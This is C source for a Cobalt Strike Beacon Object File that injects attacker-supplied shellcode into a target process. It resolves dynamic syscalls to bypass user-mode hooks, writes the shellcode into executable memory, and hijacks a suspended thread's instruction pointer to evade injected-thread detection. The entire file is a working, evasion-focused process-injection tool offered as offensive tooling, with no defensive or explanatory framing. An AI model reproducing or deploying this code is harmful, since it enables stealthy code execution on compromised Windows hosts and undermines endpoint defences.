// Chris Sikes
// Apr 2021
// Credit to: XPN's SetThreadContext https://blog.xpnsec.com/undersanding-and-evading-get-injectedthread/
// Credit to: ajcp500 for BOF Dynamic syscalls https://github.com/ajpc500/BOFs/tree/main/SyscallsInject
// Beacon Object file version with dynamic syscalls
#include <windows.h>
#include "beacon.h"
#include "Syscalls.h"

WINBASEAPI FARPROC WINAPI KERNEL32$GetProcAddress (HMODULE hModule, LPCSTR lpProcName);

void go(char * argc, int len)
{
	syscall_t sys;
	syscall_t *syscall;
	
	char* shellcode;
	SIZE_T shell_len;
	datap	parser;
	HANDLE Process_Handle;
	CLIENT_ID id = {0};
	OBJECT_ATTRIBUTES oa = {sizeof(oa)};
	PVOID Alloc = NULL;
	CONTEXT ctx;

	BeaconDataParse(&parser, argc, len);
	DWORD pid = BeaconDataInt(&parser);
	shell_len = BeaconDataLength(&parser);
	shellcode = BeaconDataExtract(&parser, NULL);
	id.UniqueProcess = pid;
	char currentDir[MAX_PATH];
	SIZE_T bytesWritten = 0;
	HANDLE threadHandle;
	NTSTATUS nts;

	// resolve syscall addresses
    	sys.NtOpenProcess = (NtOpenProcess_t)GetSyscallStub("NtOpenProcess");
	sys.NtAllocateVirtualMemory = (NtAllocateVirtualMemory_t)GetSyscallStub("NtAllocateVirtualMemory");
    	sys.NtWriteVirtualMemory = (NtWriteVirtualMemory_t)GetSyscallStub("NtWriteVirtualMemory");
	sys.NtCreateThreadEx = (NtCreateThreadEx_t)GetSyscallStub("NtCreateThreadEx");
	sys.NtGetContextThread = (NtGetContextThread_t)GetSyscallStub("NtGetContextThread");
  	sys.NtSetContextThread = (NtSetContextThread_t)GetSyscallStub("NtSetContextThread");
  	sys.NtResumeThread = (NtResumeThread_t)GetSyscallStub("NtResumeThread");
	sys.NtClose = (NtClose_t)GetSyscallStub("NtClose");

	syscall = &sys;
	//InjectShellcode(&sc, pid, shellcode, shell_len);
	nts = syscall->NtOpenProcess(&Process_Handle, PROCESS_ALL_ACCESS, &oa, &id);
	if(nts < 0)
	{
		BeaconPrintf(CALLBACK_ERROR, "Failed NtOpenProcess");
		goto clean;
	}

	nts = syscall->NtAllocateVirtualMemory(Process_Handle, &Alloc, 0, &shell_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if(nts < 0)
	{
		BeaconPrintf(CALLBACK_ERROR, "Failed NtAllocateVirtualMemory");
		goto clean;
	}

	void *_loadLibrary = KERNEL32$GetProcAddress(LoadLibraryA("kernel32.dll"), "LoadLibraryA");


	nts = syscall->NtWriteVirtualMemory(Process_Handle, Alloc, shellcode, shell_len, NULL);
	if(nts < 0)
	{
		BeaconPrintf(CALLBACK_ERROR, "Failed NtWriteVirtualMemory");
		goto clean;
	}

	nts = syscall->NtCreateThreadEx(&threadHandle, THREAD_ALL_ACCESS, NULL, Process_Handle, _loadLibrary, NULL, TRUE, 0, 0, 0, NULL);

	ctx.ContextFlags = CONTEXT_CONTROL;
	nts = syscall->NtGetContextThread(threadHandle, &ctx);
	if(nts < 0)
	{
		BeaconPrintf(CALLBACK_ERROR, "Failed NtGetContextThread");
		goto clean;
	}

	ctx.Rip = (DWORD64)Alloc;
	nts = syscall->NtSetContextThread(threadHandle, &ctx);
	if(nts < 0)
	{
		BeaconPrintf(CALLBACK_ERROR, "Failed NtSetContextThread");
		goto clean;
	}

	nts = syscall->NtResumeThread(threadHandle, NULL);
	if(nts < 0)
	{
		BeaconPrintf(CALLBACK_ERROR, "Failed NtResumeThread");
		goto clean;
	}

clean:
	if(threadHandle != NULL)
	{
		//BeaconPrintf(CALLBACK_OUTPUT, "Cleaning up threadHandle");
		syscall->NtClose(threadHandle);
	}

	if(Process_Handle != NULL)
	{
		//BeaconPrintf(CALLBACK_OUTPUT, "Cleaning up Process_Handle");
		syscall->NtClose(Process_Handle);
	}
}
